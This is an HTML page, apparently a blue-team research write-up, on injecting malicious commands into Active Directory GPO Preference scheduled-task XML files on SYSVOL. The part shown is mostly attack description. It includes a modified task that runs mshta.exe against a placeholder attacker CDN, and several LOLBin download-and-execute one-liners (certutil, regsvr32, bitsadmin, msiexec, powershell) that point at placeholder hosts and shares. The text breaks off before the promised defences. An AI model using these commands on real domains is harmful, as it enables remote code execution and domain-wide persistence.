@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ShadowPolicy — GPO Preference State-Injection | QA210 Research</title>
+<meta name="description" content="Deep research on ShadowPolicy threat model: GPO Preference Scheduled Task XML State-Injection in Active Directory environments. Blue Team defensive architecture.">
+<meta name="author" content="QA210">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+:root{
+  --bg0:#06080c;--bg1:#0b0f17;--bg2:#111827;--bg3:#1a2234;--bg4:#222d42;
+  --border:#1e293b;--border-light:#334155;--border-glow:rgba(88,166,255,0.15);
+  --text0:#f1f5f9;--text1:#e2e8f0;--text2:#94a3b8;--text3:#64748b;--text4:#475569;
+  --accent:#3b82f6;--accent-hover:#60a5fa;--accent-dim:rgba(59,130,246,0.1);
+  --green:#22c55e;--green-dim:rgba(34,197,94,0.1);
+  --red:#ef4444;--red-dim:rgba(239,68,68,0.1);
+  --purple:#a855f7;--purple-dim:rgba(168,85,247,0.1);
+  --orange:#f97316;--orange-dim:rgba(249,115,22,0.1);
+  --yellow:#eab308;--yellow-dim:rgba(234,179,8,0.1);
+  --cyan:#06b6d4;--cyan-dim:rgba(6,182,212,0.1);
+  --rose:#f43f5e;--rose-dim:rgba(244,63,94,0.1);
+  --gradient-accent:linear-gradient(135deg,#3b82f6,#8b5cf6);
+  --gradient-warm:linear-gradient(135deg,#f97316,#ef4444);
+  --gradient-cool:linear-gradient(135deg,#06b6d4,#3b82f6);
+  --gradient-rose:linear-gradient(135deg,#f43f5e,#a855f7);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--border) var(--bg1)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg0);color:var(--text1);line-height:1.75;font-size:15px;overflow-x:hidden;-webkit-font-smoothing:antialiased}
+::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:var(--bg1)}::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:3px}
+a{color:var(--accent);text-decoration:none;transition:all .2s}a:hover{color:var(--accent-hover)}
+::selection{background:rgba(59,130,246,0.3);color:var(--text0)}
+#bg-canvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;pointer-events:none;opacity:.1}
+
+/* HEADER */
+.site-header{position:sticky;top:0;z-index:100;background:rgba(6,8,12,0.85);backdrop-filter:blur(20px) saturate(1.2);border-bottom:1px solid var(--border);height:58px;display:flex;align-items:center;padding:0 2.5rem;gap:2rem}
+.site-header .brand{display:flex;align-items:center;gap:10px;font-family:'Space Grotesk','JetBrains Mono',monospace;font-weight:700;font-size:1.1rem;color:var(--text0);white-space:nowrap;letter-spacing:-.03em}
+.site-header .brand .logo-icon{width:28px;height:28px;border-radius:7px;background:var(--gradient-accent);display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:800;color:#fff}
+.site-header .brand .cursor{display:inline-block;width:2px;height:1em;background:var(--green);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.site-header .nav-main{display:flex;gap:0;align-items:center}
+.site-header .nav-main a{padding:0 1.1rem;height:58px;display:flex;align-items:center;color:var(--text3);font-size:.82rem;font-weight:500;border-bottom:2px solid transparent;transition:all .2s}
+.site-header .nav-main a:hover,.site-header .nav-main a.active{color:var(--text0);border-bottom-color:var(--accent)}
+.site-header .nav-right{margin-left:auto;display:flex;align-items:center;gap:1.1rem}
+.social-link{color:var(--text4);font-size:1.05rem;transition:all .2s;padding:4px}
+.social-link:hover{color:var(--accent);transform:translateY(-1px)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--text1);font-size:1.3rem;cursor:pointer}
+
+/* BREADCRUMBS */
+.breadcrumbs{position:relative;z-index:1;max-width:1320px;margin:0 auto;padding:1rem 2.5rem .5rem;display:flex;align-items:center;gap:.5rem;font-size:.75rem;color:var(--text4)}
+.breadcrumbs a{color:var(--text3)}.breadcrumbs a:hover{color:var(--accent)}
+.breadcrumbs .sep{opacity:.4}.breadcrumbs .current{color:var(--text2);font-weight:600}
+
+/* LAYOUT */
+.page-body{position:relative;z-index:1;max-width:1320px;margin:0 auto;padding:0 2.5rem}
+.writeup-layout{display:grid;grid-template-columns:1fr 260px;gap:3rem;padding-bottom:4rem}
+
+/* HERO */
+.writeup-hero{padding:2.5rem 0 2rem;border-bottom:1px solid var(--border);margin-bottom:2rem}
+.writeup-hero .meta-top{display:flex;align-items:center;gap:.75rem;margin-bottom:1rem;flex-wrap:wrap}
+.writeup-hero .meta-top .platform{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;padding:3px 10px;border-radius:5px;background:var(--rose-dim);color:var(--rose);border:1px solid rgba(244,63,94,0.25)}
+.writeup-hero .meta-top .category{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;padding:3px 10px;border-radius:5px;background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(6,182,212,0.25)}
+.writeup-hero .meta-top .date{font-size:.72rem;color:var(--text4);font-family:'JetBrains Mono',monospace;margin-left:auto}
+.writeup-hero h1{font-family:'Space Grotesk','Inter',sans-serif;font-size:2.4rem;font-weight:800;letter-spacing:-.03em;line-height:1.15;margin-bottom:.75rem;color:var(--text0)}
+.writeup-hero h1 span{background:var(--gradient-rose);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.writeup-hero .subtitle{color:var(--text2);font-size:1rem;line-height:1.7;margin-bottom:1.25rem;max-width:780px}
+.writeup-hero .tags{display:flex;flex-wrap:wrap;gap:.4rem}
+.writeup-hero .tag{font-size:.62rem;padding:3px 10px;border-radius:5px;background:var(--bg2);color:var(--text2);border:1px solid var(--border);font-weight:500}
+
+/* CONTENT */
+.writeup-content h2{font-family:'Space Grotesk',sans-serif;font-size:1.5rem;font-weight:700;color:var(--text0);margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border);letter-spacing:-.02em}
+.writeup-content h3{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;font-weight:700;color:var(--text1);margin:1.75rem 0 .75rem}
+.writeup-content h4{font-size:.95rem;font-weight:700;color:var(--text2);margin:1.25rem 0 .5rem}
+.writeup-content p{margin-bottom:1rem;color:var(--text1)}
+.writeup-content ul,.writeup-content ol{margin-bottom:1rem;padding-left:1.5rem;color:var(--text1)}
+.writeup-content li{margin-bottom:.35rem}
+.writeup-content strong{color:var(--text0);font-weight:600}
+.writeup-content em{color:var(--text2);font-style:italic}
+
+/* CODE BLOCKS */
+.code-block{position:relative;margin:1.25rem 0;border-radius:10px;overflow:hidden;border:1px solid var(--border);background:var(--bg1)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;padding:.5rem 1rem;background:var(--bg2);border-bottom:1px solid var(--border);font-size:.7rem}
+.code-block .code-header .lang{color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.05em}
+.code-block .code-header .filename{color:var(--text4);font-family:'JetBrains Mono',monospace;font-size:.68rem}
+.code-block .copy-btn{background:none;border:1px solid var(--border);color:var(--text3);font-size:.65rem;padding:2px 10px;border-radius:4px;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
+.code-block .copy-btn:hover{border-color:var(--accent);color:var(--accent)}
+.code-block pre{margin:0!important;padding:1rem!important;background:transparent!important;overflow-x:auto}
+.code-block pre code{font-family:'JetBrains Mono',monospace!important;font-size:.8rem!important;line-height:1.6!important}
+pre[class*="language-"]{background:var(--bg1)!important;margin:0!important;padding:1rem!important}
+code[class*="language-"]{font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important;text-shadow:none!important}
+.token.comment,.token.prolog{color:var(--text4)!important}
+.token.keyword{color:var(--purple)!important}
+.token.string{color:var(--green)!important}
+.token.function{color:var(--cyan)!important}
+.token.number{color:var(--orange)!important}
+.token.operator{color:var(--text2)!important}
+.token.punctuation{color:var(--text3)!important}
+.token.attr-name{color:var(--cyan)!important}
+.token.attr-value{color:var(--green)!important}
+.token.tag{color:var(--red)!important}
+
+/* CALLOUT BOXES */
+.callout{margin:1.25rem 0;padding:1rem 1.25rem;border-radius:10px;border-left:3px solid;font-size:.88rem;line-height:1.7}
+.callout .callout-title{font-weight:700;font-size:.78rem;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.4rem;display:flex;align-items:center;gap:6px}
+.callout.danger{background:rgba(239,68,68,0.06);border-color:var(--red);color:var(--text1)}
+.callout.danger .callout-title{color:var(--red)}
+.callout.warning{background:rgba(249,115,22,0.06);border-color:var(--orange);color:var(--text1)}
+.callout.warning .callout-title{color:var(--orange)}
+.callout.info{background:rgba(59,130,246,0.06);border-color:var(--accent);color:var(--text1)}
+.callout.info .callout-title{color:var(--accent)}
+.callout.success{background:rgba(34,197,94,0.06);border-color:var(--green);color:var(--text1)}
+.callout.success .callout-title{color:var(--green)}
+.callout code{background:var(--bg2);padding:1px 5px;border-radius:3px;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--cyan)}
+
+/* COMPARISON TABLE */
+.compare-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.82rem}
+.compare-table th{background:var(--bg2);color:var(--text2);font-weight:600;text-align:left;padding:.6rem .85rem;border:1px solid var(--border);font-size:.72rem;text-transform:uppercase;letter-spacing:.05em}
+.compare-table td{padding:.55rem .85rem;border:1px solid var(--border);color:var(--text1)}
+.compare-table tr:nth-child(even) td{background:var(--bg1)}
+.compare-table td:first-child{font-weight:600;color:var(--text0)}
+
+/* FLOW DIAGRAM */
+.flow-diagram{background:var(--bg1);border:1px solid var(--border);border-radius:10px;padding:1.5rem;margin:1.25rem 0;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.8;color:var(--text2);overflow-x:auto;white-space:pre}
+.flow-diagram .highlight{color:var(--red);font-weight:700}
+.flow-diagram .success{color:var(--green);font-weight:700}
+.flow-diagram .accent{color:var(--cyan);font-weight:700}
+
+/* SIDEBAR TOC */
+.sidebar-toc{position:sticky;top:72px;align-self:start;max-height:calc(100vh - 90px);overflow-y:auto}
+.sidebar-toc .toc-title{font-size:.62rem;text-transform:uppercase;letter-spacing:.12em;color:var(--text4);font-weight:700;margin-bottom:1rem;display:flex;align-items:center;gap:7px}
+.sidebar-toc .toc-title i{font-size:.78rem;color:var(--accent)}
+.toc-list{list-style:none;padding:0}
+.toc-list li{margin-bottom:.15rem}
+.toc-list a{display:block;padding:.3rem .6rem;font-size:.75rem;color:var(--text3);border-radius:5px;transition:all .2s;border-left:2px solid transparent;line-height:1.5}
+.toc-list a:hover{color:var(--text1);background:var(--bg2);border-left-color:var(--accent)}
+.toc-list a.active{color:var(--accent);background:var(--accent-dim);border-left-color:var(--accent);font-weight:600}
+.toc-list .toc-h3{padding-left:1.2rem;font-size:.7rem}
+.sidebar-meta{margin-top:1.5rem;padding-top:1rem;border-top:1px solid var(--border)}
+.sidebar-meta .meta-item{display:flex;align-items:center;gap:.6rem;font-size:.72rem;color:var(--text3);margin-bottom:.5rem}
+.sidebar-meta .meta-item i{color:var(--accent);width:14px;text-align:center;font-size:.7rem}
+
+/* FOOTER */
+.site-footer{border-top:1px solid var(--border);padding:2rem 2.5rem;position:relative;z-index:1}
+.footer-inner{max-width:1320px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem}
+.footer-left{font-size:.76rem;color:var(--text4)}.footer-left span{color:var(--text2);font-weight:600}
+.footer-links{display:flex;gap:1.5rem}.footer-links a{color:var(--text4);font-size:.76rem;transition:color .2s}.footer-links a:hover{color:var(--text1)}
+
+/* RESPONSIVE */
+@media(max-width:1024px){.writeup-layout{grid-template-columns:1fr}.sidebar-toc{display:none}}
+@media(max-width:768px){.site-header{padding:0 1rem}.site-header .nav-main{display:none}.mobile-toggle{display:block}.page-body{padding:0 1rem}.writeup-hero h1{font-size:1.7rem}.breadcrumbs{padding:1rem 1rem .5rem}.footer-inner{flex-direction:column;text-align:center}}
+@media(max-width:480px){.writeup-hero h1{font-size:1.4rem}.flow-diagram{font-size:.68rem;padding:1rem}}
+</style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tjctf/">TJCTF</a>
+    <a href="/thm/">TryHackMe</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ" style="color:var(--yellow)"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="breadcrumbs">
+  <a href="/">Home</a><span class="sep">/</span>
+  <a href="/research/">Research</a><span class="sep">/</span>
+  <a href="/research/gpo/">GPO</a><span class="sep">/</span>
+  <span class="current">ShadowPolicy</span>
+</div>
+
+<div class="page-body">
+
+<section class="writeup-hero">
+  <div class="meta-top">
+    <span class="platform"><i class="bi bi-shield-lock-fill"></i> Blue Team Research</span>
+    <span class="category"><i class="bi bi-diagram-3-fill"></i> Active Directory</span>
+    <span class="date">2026</span>
+  </div>
+  <h1>ShadowPolicy — <span>GPO Preference State-Injection</span></h1>
+  <p class="subtitle">Advanced detection and auditing framework for the ShadowPolicy threat model: exploiting GPO Preference Scheduled Task XML injection via SYSVOL state modification in Windows Server 2022 / Active Directory environments. A defensive architecture analysis covering DSC hardening, SACL auditing, integrity monitoring, and SIEM detection rules.</p>
+  <div class="tags">
+    <span class="tag">GPO Abuse</span><span class="tag">Scheduled Tasks</span><span class="tag">SYSVOL</span><span class="tag">SACL</span><span class="tag">DSC</span><span class="tag">Blue Team</span><span class="tag">LOLBin</span><span class="tag">MITRE T1484.001</span><span class="tag">MITRE T1053.005</span><span class="tag">Defensive Architecture</span>
+  </div>
+</section>
+
+<div class="writeup-layout">
+
+<main class="writeup-content">
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="overview">1. Overview — The ShadowPolicy Threat Model</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>ShadowPolicy is a threat model that describes a class of attacks where an adversary who has obtained GPO edit privileges modifies the content of GPO Preference XML files stored in the SYSVOL share, specifically targeting the <code>ScheduledTasks.xml</code> file to inject malicious execution commands. Unlike traditional attacks that create new suspicious objects, ShadowPolicy <strong>modifies existing trusted objects</strong> — replacing the command executed by a legitimate scheduled task with a malicious one, while preserving all other attributes (triggers, description, namespace) to avoid detection.</p>
+
+<p>The core insight is devastating in its simplicity: GPO Preference XML files are <strong>not digitally signed</strong>. Only the GPO metadata (version number) stored in Active Directory is protected by Kerberos. The actual content files on SYSVOL can be modified by anyone with write access to the share, and the Group Policy Client-Side Extension for Scheduled Tasks (<code>taskschd.dll</code>) does not validate the executable path in the <code>&lt;Command&gt;</code> element. When the <code>action="R"</code> (Replace) mode is used, the entire task configuration is overwritten — including the Actions section — without any integrity checks.</p>
+
+<div class="callout danger">
+  <div class="callout-title"><i class="bi bi-exclamation-triangle-fill"></i> Key Finding</div>
+  This attack bypasses <strong>all perimeter security tools</strong> — Email Gateway, Web Proxy, NGFW/IDS, and EDR network inspection — because the delivery channel is the trusted SYSVOL replication mechanism itself. No email is sent, no web request is made to an external host, and the SMB traffic between workstations and domain controllers is Kerberos-signed and typically whitelisted entirely.
+</div>
+
+<p>This research document provides a comprehensive analysis of the attack chain, the four critical logic flaws in GPO Preference design that enable it, the complete internal execution flow, and a full defensive architecture built on PowerShell DSC, SACL auditing, integrity monitoring, and SIEM detection rules.</p>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="state-sync">2. State-Sync Mechanism — The Delivery Channel</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<h3 id="sysvol-infrastructure">SYSVOL Infrastructure</h3>
+
+<p>The SYSVOL share (<code>\\DOMAIN\SYSVOL\</code>) is the primary storage location for Group Policy Objects in Active Directory. Every domain controller replicates this content via DFS-R (Distributed File System Replication). The critical path targeted by ShadowPolicy is:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">Path</span><span class="filename">SYSVOL Target</span></div>
+  <pre><code class="language-bash">\\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\{GPO-GUID}\Machine\Preferences\ScheduledTasks\
+    └── ScheduledTasks.xml   ← ATTACK TARGET</code></pre>
+</div>
+
+<p>Three components form the delivery pipeline that ShadowPolicy exploits:</p>
+
+<ol>
+  <li><strong>SYSVOL Share</strong> — The file system location where GPO Preference XML files are stored. DFS-R replicates changes across all DCs within 15-60 seconds. DFS-R does not inspect file content — it only synchronizes bytes.</li>
+  <li><strong>Group Policy Client Service (gpsvc)</strong> — Running inside <code>svchost.exe -k netsvcs</code>, this service automatically connects to a DC every 90-120 minutes (plus a random offset of 0-30 minutes), reads SYSVOL via SMB (port 445), and applies any GPO changes. This is a completely automatic PULL mechanism.</li>
+  <li><strong>GPO CSE {AADCED64-746C-4633-A97C-D61349046527}</strong> — The Client-Side Extension that handles the "Scheduled Tasks" portion of GPO Preferences. The module is <code>C:\Windows\System32\taskschd.dll</code>, invoked by gpsvc when it detects a GPO version number increase.</li>
+</ol>
+
+<h3 id="why-perimeter-fails">Why Perimeter Security Fails Completely</h3>
+
+<table class="compare-table">
+  <tr><th>Security Tool</th><th>Reason for Failure</th></tr>
+  <tr><td>Email Gateway</td><td>No email is sent. No attachment exists. All delivery occurs through AD replication.</td></tr>
+  <tr><td>Web Proxy</td><td>Communication between workstation and DC uses SMB (TCP 445), Kerberos (UDP/TCP 88), LDAP (TCP 389/636). This is internal traffic that never passes through a proxy.</td></tr>
+  <tr><td>EDR Network</td><td>SMB traffic to DCs is signed by Kerberos and encrypted by SMB Encryption. Network inspection cannot distinguish a legitimate GPO from a trojanized one.</td></tr>
+  <tr><td>NGFW / IDS</td><td>DC-to-Workstation SMB is trusted internal traffic, typically whitelisted entirely in enterprise firewall rules.</td></tr>
+</table>
+
+<div class="callout warning">
+  <div class="callout-title"><i class="bi bi-shield-exclamation"></i> Blind Spot</div>
+  The SYSVOL delivery channel is a <strong>perfect blind spot</strong> for all perimeter tools. The attacker never sends anything directly to the victim — Windows itself delivers the payload through its own trusted Group Policy mechanism.
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="weaponized-state">3. Weaponized State Analysis — The XML Injection</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<h3 id="prerequisites">Attacker Prerequisites</h3>
+
+<p>The attacker needs an account with GPO edit privileges — <strong>not Domain Admin</strong>. In a typical enterprise, many accounts have this privilege:</p>
+
+<ul>
+  <li>Members of <strong>Group Policy Creator Owners</strong></li>
+  <li>IT Helpdesk accounts delegated "Edit GPO" rights on specific OUs</li>
+  <li>Service accounts for endpoint management systems (SCCM, Ansible, Intune)</li>
+  <li>Any account where "Authenticated Users" has been mistakenly delegated GPO edit rights (~40% of enterprises)</li>
+</ul>
+
+<h3 id="before-after">Before and After — The XML Modification</h3>
+
+<p><strong>Before attack</strong> — legitimate ScheduledTasks.xml:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">XML</span><span class="filename">ScheduledTasks.xml (Before)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A0CE23715DED}"&gt;
+  &lt;TaskV2 clsid="{...}" name="WindowsUpdate_Scheduled" ...&gt;
+    &lt;Properties action="U" name="WindowsUpdate_Scheduled" ...&gt;
+      &lt;Task version="1.3"&gt;
+        &lt;Triggers&gt;
+          &lt;TimeTrigger&gt;
+            &lt;Repetition&gt;&lt;Interval&gt;PT1H&lt;/Interval&gt;&lt;/Repetition&gt;
+          &lt;/TimeTrigger&gt;
+        &lt;/Triggers&gt;
+        &lt;Actions Context="Author"&gt;
+          &lt;Exec&gt;
+            &lt;Command&gt;%SystemRoot%\system32\wuauclt.exe&lt;/Command&gt;
+            &lt;Arguments&gt;/RunHandlerComServer&lt;/Arguments&gt;
+          &lt;/Exec&gt;
+        &lt;/Actions&gt;
+      &lt;/Task&gt;
+    &lt;/Properties&gt;
+  &lt;/TaskV2&gt;
+&lt;/ScheduledTasks&gt;</code></pre>
+</div>
+
+<p><strong>After attack</strong> — ShadowPolicy state modification:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">XML</span><span class="filename">ScheduledTasks.xml (After — Injected)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-markup">&lt;ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A0CE23715DED}"&gt;
+  &lt;TaskV2 clsid="{...}" name="WindowsUpdate_Scheduled" ...&gt;
+    &lt;Properties action="R" ...&gt;  &lt;!-- action="R" = REPLACE (entire task) --&gt;
+      &lt;Task version="1.3"&gt;
+        &lt;Triggers&gt;
+          &lt;TimeTrigger&gt;  &lt;!-- Original trigger preserved --&gt;
+            &lt;Repetition&gt;&lt;Interval&gt;PT1H&lt;/Interval&gt;&lt;/Repetition&gt;
+          &lt;/TimeTrigger&gt;
+        &lt;/Triggers&gt;
+        &lt;Principals&gt;
+          &lt;Principal id="Author"&gt;
+            &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;  &lt;!-- Elevated privileges --&gt;
+          &lt;/Principal&gt;
+        &lt;/Principals&gt;
+        &lt;Actions Context="Author"&gt;
+          &lt;Exec&gt;
+            &lt;Command&gt;%SystemRoot%\system32\mshta.exe&lt;/Command&gt;
+            &lt;Arguments&gt;https://[ATTACKER-CDN]/bootstrap.hta&lt;/Arguments&gt;
+          &lt;/Exec&gt;
+        &lt;/Actions&gt;
+      &lt;/Task&gt;
+    &lt;/Properties&gt;
+  &lt;/TaskV2&gt;
+&lt;/ScheduledTasks&gt;</code></pre>
+</div>
+
+<p>The key changes are minimal but devastating: <code>action="U"</code> becomes <code>action="R"</code>, and the <code>&lt;Command&gt;</code> and <code>&lt;Arguments&gt;</code> are replaced. The trigger, description, and all other attributes remain identical to avoid suspicion.</p>
+
+<h3 id="four-flaws">Four Critical Logic Flaws in GPO Preference Design</h3>
+
+<h4>FLAW #1 — action="R" (Replace Mode) Has No Command Validation</h4>
+
+<p>GPO Preference Scheduled Tasks support four action modes: <code>C</code> (Create), <code>R</code> (Replace), <code>U</code> (Update), <code>D</code> (Delete). When <code>action="R"</code> is used, the entire task configuration is replaced — including the Actions section. The CSE module <code>taskschd.dll</code> simply calls <code>ITaskFolder::RegisterTask()</code> with the XML it receives. There is <strong>no validation</strong> of the executable path in the <code>&lt;Command&gt;</code> element — no whitelist check, no path verification, no signature requirement.</p>
+
+<h4>FLAW #2 — GPO Preference XML Files Are Not Digitally Signed</h4>
+
+<p>Only GPO metadata (the version number stored in Active Directory) is protected by Kerberos authentication. The actual content files on SYSVOL — including <code>ScheduledTasks.xml</code>, <code>Registry.xml</code>, <code>Services.xml</code> — have <strong>no digital signature</strong>. Anyone with write access to the SYSVOL share can modify these files, and the CSE will faithfully process whatever content it finds.</p>
+
+<h4>FLAW #3 — Modifying an Existing Task Bypasses "New Task" Detection</h4>
+
+<p>By modifying an existing task rather than creating a new one, the attack generates Event 4702 (<em>A scheduled task was updated</em>) instead of Event 4698 (<em>A scheduled task was created</em>). Most SIEM rule sets only alert on task creation (Event 4698) — approximately 80% of enterprises monitor for new task creation, but only ~15% monitor for task updates. This is a critical detection gap that ShadowPolicy exploits.</p>
+
+<h4>FLAW #4 — Microsoft Namespace Trust Inheritance</h4>
+
+<p>System tasks in the <code>\Microsoft\Windows\</code> namespace typically run under SYSTEM or LOCAL SERVICE accounts. GPO Replace mode inherits the existing principal, allowing LOLBin execution (e.g., <code>mshta.exe</code>) with SYSTEM privileges. Furthermore, many EDR solutions apply path-based whitelisting for tasks within the Microsoft namespace, assuming they are trustworthy by default.</p>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="execution-flow">4. Native Execution Flow — Complete Attack Chain</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<div class="flow-diagram">
+<strong>[T+0min]</strong>  Attacker modifies ScheduledTasks.xml on DC SYSVOL
+           │  Kerberos-authenticated SMB write
+           │  GPO version counter incremented
+           │  → <span class="highlight">Event 5136</span> (AD Object Modified) — IF SACL is configured
+           │
+<strong>[T+0-60s]</strong>  DFS-R replicates to all DCs
+           │  No content inspection — only byte synchronization
+           │  <span class="success">No alert</span> — this is normal AD behavior
+           │
+<strong>[T+~90min]</strong>  Automatic gpupdate cycle on victim machine:
+           │
+           ├─ svchost.exe -k netsvcs -s gpsvc
+           │   └── GroupPolicyClient.dll → ProcessGroupPolicyEx()
+           │       └── Connect to DC via Kerberos SMB (port 445)
+           │           └── Read \\DC\SYSVOL\...\ScheduledTasks.xml
+           │               └── Detect new version counter → trigger CSE
+           │
+           ├─ gpsvc loads CSE: taskschd.dll
+           │   └── ITaskService::GetFolder("\Microsoft\Windows")
+           │       └── ITaskFolder::GetTask("WindowsUpdate_Scheduled")
+           │           └── ITaskFolder::RegisterTask() with new XML
+           │               → action="R" → <span class="highlight">OVERWRITE</span> entire Actions
+           │               → <span class="highlight">Event 4702</span>: "A scheduled task was updated"
+           │                   SubjectUserName: SYSTEM
+           │                   TaskName: \Microsoft\Windows\WindowsUpdate_Scheduled
+           │
+<strong>[T+~91min]</strong>  Task trigger fires (every 1 hour):
+           │
+           ├─ svchost.exe -k netsvcs -s Schedule
+           │   └── CreateProcess("mshta.exe", "https://[ATTACKER-CDN]/bootstrap.hta")
+           │       → <span class="highlight">Event 4688</span>: Process Created
+           │           Parent: svchost.exe
+           │           Child:  mshta.exe
+           │           CommandLine: mshta.exe https://[...]/bootstrap.hta
+           │
+<strong>[T+~92min]</strong>  mshta.exe payload execution:
+           │
+           └─ Downloads bootstrap.hta via HTTPS (TLS 1.3)
+               └── JScript/VBScript runs <span class="accent">entirely in-memory</span>:
+                   • WScript.Shell.Run() / DotNetToJScript
+                   • <span class="accent">NO files written to disk</span>
+                   → Payload exists 100% in memory, under SYSTEM privileges</div>
+
+<div class="callout info">
+  <div class="callout-title"><i class="bi bi-info-circle-fill"></i> Why EDR Misses This</div>
+  <ul>
+    <li><strong>Process chain <code>svchost.exe → mshta.exe</code></strong> exists in enterprise baselines — many SCCM/MDM deployments use mshta for silent HTA installs.</li>
+    <li><strong>Event 4702</strong> (Task Updated) is rarely correlated compared to Event 4698 (Task Created).</li>
+    <li><strong>Task name in Microsoft namespace</strong> — EDR often whitelists tasks under <code>\Microsoft\Windows\</code> based on path prefix.</li>
+    <li><strong>Legitimate-looking domain</strong> — if the URL uses a domain like <code>cdn.windowsupdate-files.com</code>, behavioral rules will not fire.</li>
+    <li><strong>No disk artifacts</strong> — AMSI scan and file hash checks are useless. Payload exists entirely in memory.</li>
+  </ul>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<h2 id="alternative-paths">5. Alternative Attack Paths — Beyond mshta.exe</h2>
+<!-- ═══════════════════════════════════════════════════════ -->
+
+<p>A critical insight is that <code>mshta.exe</code> is only one of an effectively unlimited number of execution options. The attacker controls the entire <code>&lt;Command&gt;</code> element and can substitute any executable. This makes blocklist-based defense fundamentally futile.</p>
+
+<h3>Layer 1: Known LOLBins</h3>
+<p>These are already flagged by most EDR solutions but demonstrate the breadth of options:</p>
+
+<div class="code-block">
+  <div class="code-header"><span class="lang">Batch</span><span class="filename">LOLBin Alternatives</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">certutil.exe -urlcache -f https://[...]/payload.exe C:\temp\p.exe && C:\temp\p.exe
+regsvr32.exe /s /n /u /i:https://[...]/scrobj.dll scrobj.dll
+rundll32.exe \\[attacker-smb]\share\payload.dll,entryPoint
+msiexec.exe /i https://[...]/payload.msi /quiet
+bitsadmin.exe /transfer p https://[...]/p.exe C:\temp\p.exe && C:\temp\p.exe</code></pre>
+</div>
+
+<h3>Layer 2: Legitimate System Tools</h3>
+<p>These are not flagged by EDR because they are standard administrative tools:</p>
+
+<table class="compare-table">
+  <tr><th>Executable</th><th>Reason EDR Doesn't Flag</th><th>Attacker Usage</th></tr>
+  <tr><td>cmd.exe</td><td>Running batch files is normal</td><td><code>cmd.exe /c net use Z: \\attacker\share && Z:\payload.exe</code></td></tr>
+  <tr><td>powershell.exe</td><td>Official management tool</td><td><code>powershell.exe -ep Bypass -File \\attacker\share\script.ps1</code></td></tr>
